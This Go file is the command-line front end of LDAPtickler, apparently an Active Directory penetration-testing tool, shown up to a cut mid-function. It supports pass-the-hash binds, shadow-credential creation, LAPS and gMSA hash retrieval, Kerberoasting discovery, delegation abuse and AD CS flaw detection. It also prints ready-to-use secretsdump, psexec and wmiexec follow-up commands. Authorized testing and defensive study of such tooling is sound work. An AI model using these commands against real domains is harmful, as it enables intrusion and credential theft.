package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"strings"

	ldaptickler "github.com/ineffectivecoder/LDAPtickler"
	"github.com/mjwhitta/cli"
	"golang.org/x/term"
)

/*
const (

	ScopeBaseObject   = 0
	ScopeSingleLevel  = 1
	ScopeWholeSubtree = 2
	// ScopeChildren is an OpenLDAP extension that may not be supported by another directory server.
	// See: https://github.com/openldap/openldap/blob/7c55484ee153047efd0e562fc1638c1a2525f320/include/ldap.h#L598
	ScopeChildren = 3

)
*/
type action struct {
	call    func(*ldaptickler.Tickler, ...string) error
	numargs int
	usage   string
}

var lookupTable map[string]action = map[string]action{
	// Todo add usages across the board
	"addloginscript": {
		call:    addloginscript,
		numargs: 2,
		usage:   "<username> <loginscript>",
	},
	"addmachine": {
		call:    addmachine,
		numargs: 2,
		usage:   "<machinename> <password>",
	},
	"addmachinelp": {
		call:    addmachinelp,
		numargs: 3,
		usage:   "<machinename> <password> <domain>",
	},
	"addshadowcredential": {
		call:    addshadowcredential,
		numargs: 1,
		usage:   "<username>",
	},
	"disableshadowcredentials": {
		call:    disableshadowcredentials,
		numargs: 1,
		usage:   "<username>",
	},
	"adddns": {
		call:    adddns,
		numargs: 2,
		usage:   "<hostname> <ipaddress>",
	},
	"addspn": {
		call:    addspn,
		numargs: 2,
		usage:   "<machinename> <spn>",
	},
	"adduser": {
		call:    adduser,
		numargs: 3,
		usage:   "<username> <principalname> <password>",
	},
	"certpublishers": {
		call:    certpublishers,
		numargs: 0,
	},
	"changepassword": {
		call:    changepassword,
		numargs: 2,
		usage:   "<username> <password>",
	},
	"collectbh": {call: collectbh, numargs: 0},
	"computers": {call: computers, numargs: 0},
	"constraineddelegation": {
		call:    constraineddelegation,
		numargs: 0,
	},
	"deleteobject": {
		call:    deleteobject,
		numargs: 2,
		usage:   "<objectname> <objecttype m or u>",
	},
	"disableconstraineddelegation": {
		call:    disablecd,
		numargs: 2,
		usage:   "<samaccountname> <spnstoremove> or <all> to remove all",
	},
	"disableloginscript": {
		call:    disableloginscript,
		numargs: 1,
		usage:   "<username>",
	},
	"disablemachine": {
		call:    disablemachine,
		numargs: 1,
		usage:   "<machinename>",
	},
	"disablerbcd": {
		call:    disablerbcd,
		numargs: 1,
		usage:   "<samaccountname>",
	},
	"disablespn": {
		call:    disablespn,
		numargs: 2,
		usage:   "<samaccountname> <spnstoremove> or <all> to remove all",
	},
	"disableunconstraineddelegation": {
		call:    disableud,
		numargs: 1,
		usage:   "<samaccountname>",
	},
	"disableuser": {
		call:    disableuser,
		numargs: 1,
		usage:   "<username>",
	},
	"dnsrecords": {call: dnsrecords, numargs: 0},
	"domaincontrollers": {
		call:    domaincontrollers,
		numargs: 0,
	},
	"enablemachine": {
		call:    enablemachine,
		numargs: 1,
		usage:   "<machinename>",
	},
	"enableconstraineddelegation": {
		call:    enablecd,
		numargs: 2,
		usage:   "<samaccountname> <spn>",
	},
	"enablerbcd": {
		call:    enablerbcd,
		numargs: 2,
		usage:   "<samaccountname> <delegatingcomputer>",
	},
	"enableuser": {
		call:    enableuser,
		numargs: 1,
		usage:   "<username>",
	},
	"fsmoroles": {call: fsmoroles, numargs: 0},
	"findadcs":  {call: findadcs, numargs: 0},
	"enableunconstraineddelegation": {
		call:    enableud,
		numargs: 1,
		usage:   "<samaccountname>",
	},
	"search": {
		call:    filter,
		numargs: 1,
		usage:   "<filter>",
	},
	"gmsaaccounts": {
		call:    gmsaaccounts,
		numargs: 0,
	},
	"groups": {call: groups, numargs: 0},
	"groupswithmembers": {
		call:    groupswithmembers,
		numargs: 0,
	},
	"kerberoastable": {
		call:    kerberoastable,
		numargs: 0,
	},
	"laps": {
		call:    laps,
		numargs: 0,
	},
	"loginscripts": {
		call:    loginscripts,
		numargs: 0,
	},
	"machineaccountquota": {
		call:    machineaccountquota,
		numargs: 0,
	},
	"machinecreationdacl": {
		call:    machinecreationdacl,
		numargs: 0,
	},
	"nopassword": {call: nopassword, numargs: 0},
	"objectquery": {
		call:    objectquery,
		numargs: 1,
		usage:   "<objectname>",
	},
	"passworddontexpire": {
		call:    passworddontexpire,
		numargs: 0,
	},
	"passwordchangenextlogin": {
		call:    passwordchangenextlogin,
		numargs: 0,
	},
	"protectedusers": {
		call:    protectedusers,
		numargs: 0,
	},
	"preauthdisabled": {
		call:    preauthdisabled,
		numargs: 0,
	},
	"querydescription": {
		call:    querydescription,
		numargs: 1,
		usage:   "<description>",
	},
	"rbcd":   {call: rbcd, numargs: 0},
	"schema": {call: schema, numargs: 0},
	"shadowcredentials": {
		call:    shadowcredentials,
		numargs: 0,
	},
	"unconstraineddelegation": {
		call:    unconstraineddelegation,
		numargs: 0,
	},
	"users":  {call: users, numargs: 0},
	"whoami": {call: whoami, numargs: 0},
}

// Global state
var state struct {
	mode     ldaptickler.BindMethod
	password string
}

// Flags
var flags struct {
	attributes        cli.StringList
	basedn            string
	collectors        cli.StringList
	dc                string
	domain            string
	domaincontrollers bool
	filter            string
	gssapi            bool
	insecure          bool
	null              bool
	output            string
	password          bool
	passwordcli       string
	proxy             string
	pth               string
	searchscope       int
	skipVerify        bool
	username          string
	useProxyChains    bool
	verbose           bool
}

func check(err error) {
	if err != nil {
		log.Fatalf("[-] %s\n", err)
	}
}

func init() {
	var bytepw []byte
	var err error

	log.Default().SetFlags(0)
	// Configure cli package
	cli.Align = true // Defaults to false
	cli.Authors = []string{"Chris Hodson r2d2@sostup.id"}
	cli.Banner = os.Args[0] + " [OPTIONS] <arg>"

	cli.Info(
		"A tool to simplify LDAP queries because it sucks and is not fun",
	)

	cli.SectionAligned(
		"Supported Utility Commands",
		"::",
		"addloginscript <username> <scriptname>:: Adds a login script to an account\n",
		"addmachine <machinename> <machinepass>::Adds a new machine to the domain\n",
		"addmachinelp <machinename> <machinepass>::Adds a new machine using low-priv credentials\n",
		"addshadowcredential <username>::Adds shadow credential and generates PFX file in current directory\n",
		"adddns <hostname> <ipaddress>::Adds a DNS A record to the AD-integrated DNS zone\n",
		"addspn <accountname> <spn>::Adds an SPN to an account\n",
		"adduser <username> <password>::Creates a new user\n",
		"changepassword <accountname> <newpassword>::Changes the password for an account\n",
		"deleteobject <objectname>::Deletes an object from the directory\n",
		"disableconstraineddelegation <accountname>::Disables constrained delegation for an account\n",
		"disableloginscript <username>::Disables a login script by removing it from the account\n",
		"disablemachine <machinename>::Disables a machine account\n",
		"disablerbcd <accountname>::Disables RBCD for an account\n",
		"disableshadowcredentials <username>::Removes all shadow credentials from the account\n",
		"disablespn <accountname> <spn>::Removes an SPN from an account\n",
		"disableunconstraineddelegation <accountname>::Disables unconstrained delegation for an account\n",
		"disableuser <username>::Disables a user account\n",
		"enableconstraineddelegation <accountname> <service>::Enables constrained delegation for an account\n",
		"enablemachine <machinename>::Enables a machine account\n",
		"enablespn <accountname> <spn>::Adds an SPN to an account\n",
		"enablerbcd <accountname> <delegatingcomputer>::Enables RBCD for an account\n",
		"enableunconstraineddelegation <accountname>::Enables unconstrained delegation for an account\n",
		"enableuser <username>::Enables a user account\n",
	)

	cli.SectionAligned(
		"Supported LDAP Queries",
		"::",
		"certpublishers::Returns all Certificate Publishers in the domain\n",
		"computers::Lists all computer objects in the domain\n",
		"collectbh::Runs SharpHound-style collectors and packages results into ZIP (use --collectors, --null, --output flags)\n",
		"constraineddelegation::Lists accounts configured for constrained delegation\n",
		"dnsrecords::Returns DNS records stored in Active Directory\n",
		"domaincontrollers::Lists all domain controllers in the domain\n",
		"findadcs::Enumerate AD CS certificate templates and detect ESC vulnerabilities\n",
		"fsmoroles::Lists all FSMO roles for the domain\n",
		"gmsaaccounts::Lists all Group Managed Service Accounts (gMSAs) in the domain, will dump NTLM hash if you have access\n",
		"groups::Lists all security and distribution groups\n",
		"groupswithmembers::Lists groups and their associated members\n",
		"kerberoastable::Finds accounts vulnerable to Kerberoasting\n",
		"laps::Retrieves LAPS passwords (Legacy and Windows LAPS) from computer objects\n",
		"loginscripts::List all configured login scripts by accounts, not including GPOs\n",
		"machineaccountquota::Displays the domain's MachineAccountQuota setting\n",
		"machinecreationdacl::Displays the domain's Machine Creation DACL\n",
		"nopassword::Lists accounts with empty or missing passwords\n",
		"objectquery::Performs a raw LDAP object query\n",
		"passworddontexpire::Lists accounts with 'Password Never Expires' set\n",
		"passwordchangenextlogin::Lists accounts that must change password at next login\n",
		"protectedusers::Lists members of the Protected Users group\n",
		"preauthdisabled::Lists accounts with Kerberos pre-authentication disabled\n",
		"querydescription::Displays descriptions\n",
		"rbcd::Lists accounts configured for Resource-Based Constrained Delegation (RBCD)\n",
		"schema::Lists schema objects or extended attributes\n",
		"search::Specify your own filter. ex. (objectClass=computer)\n",
		"shadowcredentials::Lists users with shadow (msDS-KeyCredential) credentials\n",
		"unconstraineddelegation::Lists accounts with unconstrained delegation enabled\n",
		"users::Lists all user accounts in the domain\n",
		"whoami::Runs a whoami-style LDAP query for the current user\n",
	)

	// Parse cli flags
	cli.Flag(
		&flags.attributes,
		"a",
		"attributes",
		"Specify attributes for LDAPSearch, ex samaccountname,serviceprincipalname. Usage of this may break things",
	)
	cli.Flag(
		&flags.basedn,
		"b",
		"basedn",
		"",
		"Specify baseDN for query, ex. ad.sostup.id would be dc=ad,dc=sostup,dc=id",
	)
	cli.Flag(
		&flags.collectors,
		"c",
		"collectors",
		"",
		"Comma-separated list of collectors to run (users,computers,groups,domains,ous,gpos,containers,certtemplates,enterprisecas,aiacas,rootcas,ntauthstores,issuancepolicies)",
	)
	cli.Flag(&flags.dc, "dc", "", "Identify domain controller")
	cli.Flag(&flags.domain, "d", "domain", "", "Domain for NTLM bind")
	cli.Flag(
		&flags.gssapi,
		"g",
		"gssapi",
		false,
		"Enable GSSAPI and attempt to authenticate",
	)
	cli.Flag(
		&flags.insecure,
		"insecure",
		false,
		"Use ldap:// instead of ldaps://",
	)
	cli.Flag(
		&flags.null,
		"n",
		"null",
		false,
		"Run collectors without writing files",
	)
	cli.Flag(
		&flags.output,
		"o",
		"output",
		"",
		"Output zip file path for collectors",
	)
	cli.Flag(
		&flags.password,
		"p",
		false,
		"Password to bind with, will prompt",
	)
	cli.Flag(
		&flags.passwordcli,
		"password",
		"",
		"Password to bind with, provided on command line",
	)
	cli.Flag(
		&flags.proxy,
		"proxy",
		"",
		"SOCKS5 proxy URL (e.g., socks5://127.0.0.1:9050)",
	)
	cli.Flag(&flags.pth, "pth", "", "Bind with password hash")
	cli.Flag(
		&flags.searchscope,
		"scope",
		2,
		"Define scope of search, 0=Base, 1=Single Level, 2=Whole Sub Tree, 3=Children, only used by filter and objectquery",
	)
	cli.Flag(
		&flags.skipVerify,
		"s",
		"skip",
		false,
		"Skip SSL verification",
	)
	cli.Flag(
		&flags.username,
		"u",
		"user",
		"",
		"Username to bind with",
	)
	cli.Flag(
		&flags.verbose,
		"v",
		"verbose",
		false,
		"Enable verbose output",
	)
	cli.Flag(
		&ldaptickler.Debug,
		"D",
		"debug",
		false,
		"Display LDAP equivalent command",
	)

	cli.Parse()

	// Check for dc, because wtf are we going to connect to without it
	if flags.dc == "" {
		cli.Usage(1)
	}

	// Ensure we are passing no arguments. There shouldn't be any. Only parameters.
	if cli.NArg() < 1 {
		cli.Usage(1)
	}

	if act, ok := lookupTable[strings.ToLower(cli.Arg(0))]; !ok {
		log.Fatal("[-] Invalid command")
	} else {
		if act.numargs != cli.NArg()-1 {
			log.Fatalf("Usage: ldaptickler %s %s", cli.Arg(0), act.usage)
		}
	}

	/* Various checks for flag combinations that don't make sense.
	Allowing a username for anonymous binds since the spec for LDAP allows it for tracking purposes.
	Reading password using term.ReadPassword to prevent echoing of the credential or needing it in plain text.
	*/

	if flags.password && flags.pth != "" {
		log.Fatal(
			"[-] Silly Goose detected, you can't PTH and provide a password",
		)
	}

	if flags.passwordcli != "" && flags.pth != "" {
		log.Fatal(
			"[-] Silly Goose detected, you can't PTH and provide a password",
		)
	}
	// Parse flags to determine bind mode
	switch {
	case flags.gssapi:
		state.mode = ldaptickler.MethodBindGSSAPI
	case flags.pth != "":
		state.mode = ldaptickler.MethodBindDomainPTH
	case flags.domain != "":
		state.mode = ldaptickler.MethodBindDomain
	case flags.password || flags.passwordcli != "":
		state.mode = ldaptickler.MethodBindPassword
	default:
		state.mode = ldaptickler.MethodBindAnonymous
	}
	// Based on mode prompt for password
	switch state.mode {
	case ldaptickler.MethodBindGSSAPI,
		ldaptickler.MethodBindDomain,
		ldaptickler.MethodBindPassword:
		if flags.username == "" {
			log.Fatal("[-] Username is empty, unable to continue")
		}

		if flags.passwordcli == "" {
			fmt.Printf("[+] Enter Password: ")

			bytepw, err = term.ReadPassword(int(os.Stdin.Fd()))

			fmt.Println()

			if err != nil {
				log.Fatalf("[-] Last received error message %s", err)
			}

			state.password = string(bytepw)
		} else {
			state.password = flags.passwordcli
		}
	}
	// Based on mode ensure we have the domain and username
	switch state.mode {
	case ldaptickler.MethodBindDomain,
		ldaptickler.MethodBindDomainPTH,
		ldaptickler.MethodBindGSSAPI:
		if flags.domain == "" {
			log.Fatal("[-] Domain is empty, unable to continue\n")
		} else if flags.username == "" {
			log.Fatal("[-] Username is empty, unable to continue")
		}
	}

	switch state.mode {
	case ldaptickler.MethodBindDomainPTH:
		if flags.pth == "" {
			log.Fatal("[-] PTH hash is empty, unable to continue")
		}
	}
	// Deriving the basedn from the dc hostname
	if strings.Contains(flags.dc, ".") && flags.basedn == "" {
		if net.ParseIP(flags.dc) == nil {
			flags.basedn = "DC=" + strings.Join(
				strings.Split(flags.dc, ".")[1:],
				",DC=",
			)
		}
	}

	if flags.basedn == "" {
		log.Fatal("[-] A basedn will be required for any action")
	}

	if flags.verbose {
		ldaptickler.LDAPDebug = true
	} else {
		ldaptickler.LDAPDebug = false
	}
}

func main() {
	var creds ldaptickler.Credentials
	var proto string

	if before, after, ok := strings.Cut(flags.dc, "://"); ok {
		proto = before + "://"
		flags.dc = after
	} else {
		proto = "ldaps://"
		if flags.insecure {
			proto = "ldap://"
		}
	}

	// ldaptickler.LDAPDebug = false
	var c *ldaptickler.Tickler
	var err error
	c, err = ldaptickler.New(proto+flags.dc, flags.basedn, flags.skipVerify)
	if err != nil {
		log.Fatalf("[-] Last received error message: %s", err)
	}
	if flags.proxy != "" {
		c.SetProxy(flags.proxy)
	}
	fmt.Printf("[+] Using %s protocol for bind\n", c.Proto)
	// Attempt anonymous bind, check for flag
	switch state.mode {
	case ldaptickler.MethodBindAnonymous:
		fmt.Printf("[+] Attempting anonymous bind to %s\n", flags.dc)
		creds.Username = flags.username

	case ldaptickler.MethodBindDomain:
		fmt.Printf("[+] Attempting domain bind to %s\n", flags.dc)
		creds.Domain = flags.domain
		creds.Username = flags.username
		creds.Password = state.password

	case ldaptickler.MethodBindDomainPTH:
		fmt.Printf(
			"[+] Attempting domain Pass The Hash bind to %s\n",
			flags.dc,
		)
		creds.Domain = flags.domain
		creds.Username = flags.username
		creds.Hash = flags.pth

	case ldaptickler.MethodBindPassword:
		fmt.Printf(
			"[+] Attempting bind with credentials to %s\n",
			flags.dc,
		)
		creds.Username = flags.username
		creds.Password = state.password
	case ldaptickler.MethodBindGSSAPI:
		fmt.Printf("[+] Attempting GSSAPI bind to %s\n", flags.dc)
		creds.Domain = flags.domain
		creds.Username = flags.username
		creds.Password = state.password
	}
	creds.DC = flags.dc
	err = c.Bind(state.mode, creds)
	check(err)
	defer c.Close()

	fmt.Printf("[+] Successfully connected to %s\n", flags.dc)

	err = lookupTable[strings.ToLower(cli.Arg(0))].call(
		c,
		cli.Args()[1:]...)

	check(err)

}

func addloginscript(c *ldaptickler.Tickler, args ...string) error {
	username := args[0]
	loginscript := args[1]

	err := c.SetLoginScript(username, loginscript)
	if err != nil {
		return err
	}

	fmt.Printf(
		"[+] Added login script to account %s  with name %s\n",
		username,
		loginscript,
	)

	return nil
}

func addmachine(c *ldaptickler.Tickler, args ...string) error {
	machinename := args[0]
	machinepass := args[1]
	// machinename, machinepass, _ := strings.Cut(flags.addmachine, " ")
	err := c.AddMachineAccount(machinename, machinepass)
	if err != nil {
		return err
	}

	fmt.Printf(
		"[+] Added machine account %s successfully with password %s\n",
		machinename,
		machinepass,
	)

	return nil
}

func addmachinelp(c *ldaptickler.Tickler, args ...string) error {
	machinename := args[0]
	machinepass := args[1]
	domain := args[2]

	err := c.AddMachineAccountLowPriv(
		machinename,
		machinepass,
		domain,
	)
	if err != nil {
		return err
	}

	fmt.Printf(
		"[+] Added machine account %s successfully with password %s\n",
		machinename,
		machinepass,
	)

	return nil
}

func addshadowcredential(c *ldaptickler.Tickler, args ...string) error {
	username := args[0]
	outputDir := "."

	fmt.Printf(
		"[+] Generating shadow credential PFX for account %s\n",
		username,
	)

	pfxFile, pfxPass, credentialID, err := c.AddShadowCredentialWithPFX(
		username,
		outputDir,
	)
	if err != nil {
		return err
	}

	fmt.Printf(
		"[+] Successfully added shadow credential to account %s\n",
		username,
	)
	fmt.Printf("[+] Credential ID: %s\n", credentialID)
	fmt.Printf("[+] PFX file saved to: %s\n", pfxFile)
	fmt.Printf("[+] PFX password: %s\n\n", pfxPass)

	// Display ready-to-use command
	fmt.Printf("[*] Ready to use with gettgtpkinit.py:\n")
	fmt.Printf(
		"    python3 gettgtpkinit.py -cert-pfx %s -pfx-pass '%s' %s/%s output.ccache\n\n",
		pfxFile,
		pfxPass,
		flags.domain,
		username,
	)

	// Alternative with DC specification
	fmt.Printf("[*] With specific DC:\n")
	fmt.Printf(
		"    python3 gettgtpkinit.py -cert-pfx %s -pfx-pass '%s' -dc-ip <DC_IP> %s/%s output.ccache\n\n",
		pfxFile,
		pfxPass,
		flags.domain,
		username,
	)
	// After obtaining TGT
	fmt.Printf("[*] After obtaining the TGT:\n")
	fmt.Printf("    export KRB5CCNAME=output.ccache\n")
	fmt.Printf("    klist\n\n")

	// Use the TGT
	fmt.Printf("[*] Use the TGT with impacket tools:\n")
	fmt.Printf(
		"    psexec.py -k -no-pass %s/<HOSTNAME>\n",
		flags.domain,
	)
	fmt.Printf(
		"    secretsdump.py -k -no-pass %s/<HOSTNAME>\n",
		flags.domain,
	)
	fmt.Printf(
		"    wmiexec.py -k -no-pass %s/<HOSTNAME>\n\n",
		flags.domain,
	)

	return nil
}

func disableshadowcredentials(
	c *ldaptickler.Tickler,
	args ...string,
) error {
	username := args[0]
	fmt.Printf(
		"[+] Disabling shadow credentials for account %s\n",
		username,
	)

	if err := c.RemoveShadowCredentials(username); err != nil {
		return err
	}

	fmt.Printf(
		"[+] Successfully disabled shadow credentials for account %s\n",
		username,
	)

	return nil
}

func adddns(c *ldaptickler.Tickler, args ...string) error {
	hostname := args[0]
	ipaddress := args[1]
	fmt.Printf(
		"[+] Adding DNS A record '%s' -> '%s'\n",
		hostname,
		ipaddress,
	)
	err := c.AddDNSARecord(hostname, ipaddress)
	if err != nil {
		return err
	}
	fmt.Printf(
		"[+] Successfully added DNS A record: %s -> %s\n",
		hostname,
		ipaddress,
	)

	return nil
}

func addspn(c *ldaptickler.Tickler, args ...string) error {
	machinename := args[0]
	spn := args[1]
	fmt.Printf(
		"[+] Adding spn %s to machine account %s\n",
		spn,
		machinename,
	)
	err := c.AddServicePrincipalName(machinename, spn)
	if err != nil {
		return err
	}
	fmt.Printf(
		"[+] Successfully added spn %s to machine account %s\n",
		spn,
		machinename,
	)

	return nil
}

func adduser(c *ldaptickler.Tickler, args ...string) error {
	username := args[0]
	principalname := args[1]
	userpasswd := args[2]
	fmt.Printf(
		"[+] Adding username %s with serviceprincipal %s with password %s\n",
		username,
		principalname,
		userpasswd,
	)
	err := c.AddUserAccount(username, principalname)
	if err != nil {
		return err
	}
	fmt.Printf("[+] Successfully added user account %s\n", username)
	fmt.Printf("[+] Now setting password...\n")

	err = c.SetUserPassword(username, userpasswd)
	if err != nil {
		return err
	}
	fmt.Printf(
		"[+] Password set successfully for user %s\n",
		username,
	)
	fmt.Printf("[+] Now enabling account for user %s\n", username)
	err = c.SetEnableUserAccount(username)
	if err != nil {
		return err
	}
	fmt.Printf(
		"[+] Successfully added and enabled user account %s\n",
		username,
	)

	return nil
}

func certpublishers(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all Certificate Publishers in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListCAs()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func changepassword(c *ldaptickler.Tickler, args ...string) error {
	username := args[0]
	userpasswd := args[1]

	fmt.Printf(
		"[+] Changing password for user %s with password supplied in LDAP with baseDN %s\n",
		username,
		flags.basedn,
	)
	err := c.SetUserPassword(username, userpasswd)
	if err != nil {
		return err
	}
	fmt.Printf(
		"[+] Password change successful for user %s\n",
		username,
	)

	return nil
}

func collectbh(c *ldaptickler.Tickler, args ...string) error {
	var out string
	if len(args) > 0 {
		out = args[0]
	}
	// If user provided --output, prefer that
	if flags.output != "" {
		out = flags.output
	}
	// Determine requested collectors
	collectors := []string{}
	if len(flags.collectors) > 0 {
		collectors = expandlist(flags.collectors)
	}

	fmt.Printf(
		"[+] Running SharpHound-style collectors (collectors=%v dry-run=%v) baseDN=%s\n",
		collectors,
		flags.null,
		flags.basedn,
	)

	zipPath, err := c.CollectBloodHound(
		collectors,
		out,
		flags.basedn,
		flags.null,
	)
	if err != nil {
		return err
	}

	if flags.null {
		fmt.Printf(
			"[+] Traffic sent successfully, not outputting files\n",
		)
	} else {
		fmt.Printf("[+] Successfully wrote collector output to %s\n", zipPath)
	}

	return nil
}

func computers(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all computers in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListComputers()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func constraineddelegation(
	c *ldaptickler.Tickler,
	args ...string,
) error {
	fmt.Printf(
		"[+] Searching for all Constrained Delegation objects in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListConstrainedDelegation()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func deleteobject(c *ldaptickler.Tickler, args ...string) error {
	objectname := cli.Arg(1)
	objecttype := cli.Arg(2)

	if objecttype == "m" {
		fmt.Printf("[+] Deleting machine account %s\n", objectname)
		err := c.DeleteObject(objectname, objecttype)
		if err != nil {
			return err
		}
		fmt.Printf("[+] Machine account %s deleted\n", objectname)
	} else {
		fmt.Printf("[+] Deleting user account %s\n", objectname)
		err := c.DeleteObject(objectname, objecttype)
		if err != nil {
			return err
		}
		fmt.Printf("[+] User account %s deleted\n", objectname)
	}

	return nil
}

func disableloginscript(c *ldaptickler.Tickler, args ...string) error {
	username := args[0]

	err := c.RemoveLoginScript(username)
	if err != nil {
		return err
	}

	fmt.Printf("[+] Removed login script from account %s\n", username)

	return nil
}

func disablemachine(c *ldaptickler.Tickler, args ...string) error {
	objectname := cli.Arg(1)
	err := c.SetDisableMachineAccount(objectname)
	if err != nil {
		return err
	}
	fmt.Printf("[+] Machine account %s disabled\n", objectname)

	return nil
}

func disablecd(c *ldaptickler.Tickler, args ...string) error {
	samaccountname := args[0]
	spn := args[1]
	fmt.Printf(
		"[+] Removing constrained delegation spn %s from %s \n",
		spn,
		samaccountname,
	)
	err := c.RemoveConstrainedDelegation(samaccountname, spn)
	if err != nil {
		return err
	}

	return nil
}

func disablerbcd(c *ldaptickler.Tickler, args ...string) error {
	samaccountname := args[0]
	fmt.Printf("[+] Removing RBCD from %s\n", samaccountname)
	err := c.RemoveResourceBasedConstrainedDelegation(samaccountname)
	if err != nil {
		return err
	}

	return nil
}

func disableud(c *ldaptickler.Tickler, args ...string) error {
	samaccountname := args[0]
	fmt.Printf(
		"[+] Removing unconstrained delegation from %s\n",
		samaccountname,
	)
	err := c.RemoveUnconstrainedDelegation(samaccountname)
	if err != nil {
		return err
	}

	return nil
}

func disablespn(c *ldaptickler.Tickler, args ...string) error {
	samaccountname := args[0]

	spn := args[1]
	if strings.ToLower(spn) == "all" {
		fmt.Printf(
			"[+] Removing all service principal names from %s\n",
			samaccountname,
		)
		err := c.RemoveSPNs(samaccountname, spn)
		if err != nil {
			return err
		}
	} else {
		fmt.Printf("[+] Removing service principal name %s from %s\n", spn, samaccountname)
		err := c.RemoveSPNs(samaccountname, spn)
		if err != nil {
			return err
		}
	}

	return nil
}

func disableuser(c *ldaptickler.Tickler, args ...string) error {
	objectname := cli.Arg(1)
	err := c.SetDisableUserAccount(objectname)
	if err != nil {
		return err
	}
	fmt.Printf("[+] User account %s disabled\n", objectname)

	return nil
}

func dnsrecords(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all DNS records in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListDNS()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func domaincontrollers(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all Domain Controllers in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListDCs()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func enablemachine(c *ldaptickler.Tickler, args ...string) error {
	objectname := cli.Arg(1)
	err := c.SetEnableMachineAccount(objectname)
	if err != nil {
		return err
	}
	fmt.Printf("[+] Machine account %s enabled\n", objectname)

	return nil
}

func enablecd(c *ldaptickler.Tickler, args ...string) error {
	samaccountname := args[0]
	spn := args[1]
	fmt.Printf(
		"[+] Adding constrained delegation spn %s to %s\n",
		spn,
		samaccountname,
	)
	err := c.AddConstrainedDelegation(samaccountname, spn)
	if err != nil {
		return err
	}

	return nil
}

func enableud(c *ldaptickler.Tickler, args ...string) error {
	samaccountname := args[0]
	fmt.Printf(
		"[+] Adding unconstrained delegation to %s\n",
		samaccountname,
	)
	err := c.AddUnconstrainedDelegation(samaccountname)
	if err != nil {
		return err
	}

	return nil
}

func enablerbcd(c *ldaptickler.Tickler, args ...string) error {
	samaccountname := args[0]
	delegatingcomputer := args[1]
	fmt.Printf(
		"[+] Adding RBCD to %s setting delegation for %s\n",
		samaccountname,
		delegatingcomputer,
	)
	err := c.AddResourceBasedConstrainedDelegation(
		samaccountname,
		delegatingcomputer,
	)
	if err != nil {
		return err
	}

	return nil
}

func enableuser(c *ldaptickler.Tickler, args ...string) error {
	objectname := cli.Arg(1)
	err := c.SetEnableUserAccount(objectname)
	if err != nil {
		return err
	}
	fmt.Printf("[+] User account %s enabled\n", objectname)

	return nil
}

func findadcs(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf("[+] Enumerating AD CS Certificate Templates and Enterprise CAs\n")
	fmt.Printf("[+] Base DN: %s\n\n", flags.basedn)

	result, err := c.EnumerateADCS()
	if err != nil {
		return err
	}

	// Print Enterprise CAs
	fmt.Println(strings.Repeat("=", 80))
	fmt.Printf("Certificate Authorities (%d found)\n", len(result.CAs))
	fmt.Println(strings.Repeat("=", 80) + "\n")

	for _, ca := range result.CAs {
		printCA(ca)
	}

	// Print Certificate Templates
	fmt.Println(strings.Repeat("=", 80))
	fmt.Printf("Certificate Templates (%d found)\n", len(result.Templates))
	fmt.Println(strings.Repeat("=", 80) + "\n")

	// Count vulnerable templates
	vulnCount := 0
	for _, t := range result.Templates {
		if len(t.ESCVulnerabilities) > 0 {
			vulnCount++
		}
	}

	if vulnCount > 0 {
		fmt.Printf("[!] %d vulnerable template(s) detected\n\n", vulnCount)
	}

	for _, t := range result.Templates {
		printTemplate(t)
	}

	return nil
}

func printCA(ca ldaptickler.EnterpriseCA) {
	fmt.Printf("CA Name                       : %s\n", ca.Name)
	fmt.Printf("  DNS Name                    : %s\n", ca.DNSHostname)
	fmt.Printf("  Distinguished Name          : %s\n", ca.DN)
	fmt.Printf("  Templates Published         : %d\n", len(ca.CertificateTemplates))

	// Print ESC vulnerabilities
	for _, vuln := range ca.ESCVulnerabilities {
		fmt.Printf("  [!] %s: %s\n", vuln.Name, vuln.Description)
		for _, principal := range vuln.Principals {
			fmt.Printf("      -> %s\n", principal)
		}
	}

	// Print permissions if any interesting ones found
	if len(ca.CASecurityPermissions) > 0 {
		fmt.Printf("  Permissions:\n")
		for _, perm := range ca.CASecurityPermissions {
			permStr := ""
			if perm.ManageCA {
				permStr = "ManageCA"
			}
			if perm.ManageCerts {
				if permStr != "" {
					permStr += ", "
				}
				permStr += "ManageCertificates"
			}
			if perm.Enroll {
				if permStr != "" {
					permStr += ", "
				}
				permStr += "Enroll"
			}
			fmt.Printf("    %s : %s\n", perm.PrincipalName, permStr)
		}
	}

	fmt.Println()
}

func printTemplate(t ldaptickler.CertTemplate) {
	// Print header with vulnerability indicators
	if len(t.ESCVulnerabilities) > 0 {
		var escNames []string
		for _, vuln := range t.ESCVulnerabilities {
			escNames = append(escNames, vuln.Name)
		}
		fmt.Printf("[VULNERABLE] Template: %s [%s]\n", t.Name, strings.Join(escNames, ", "))
	} else {
		fmt.Printf("Template: %s\n", t.Name)
	}

	fmt.Printf("  Display Name                : %s\n", t.DisplayName)
	fmt.Printf("  Distinguished Name          : %s\n", t.DN)
	fmt.Printf("  Schema Version              : %d\n", t.SchemaVersion)

	// Key security properties
	fmt.Printf("  Enrollee Supplies Subject   : %v\n", t.EnrolleeSuppliesSubject)
	fmt.Printf("  Manager Approval Required   : %v\n", t.ManagerApprovalRequired)
	fmt.Printf("  Authorized Signatures       : %d\n", t.AuthorizedSignaturesNeeded)
	fmt.Printf("  Client Authentication       : %v\n", t.ClientAuthEnabled)

	// EKUs
	if len(t.EKUs) > 0 {
		fmt.Printf("  Extended Key Usages:\n")
		for _, eku := range t.EKUs {
			ekuName := getEKUName(eku)
			fmt.Printf("    - %s (%s)\n", ekuName, eku)
		}
	} else {
		fmt.Printf("  Extended Key Usages         : None (Any purpose)\n")
	}

	// Validity period
	if t.ValidityPeriod != "" {
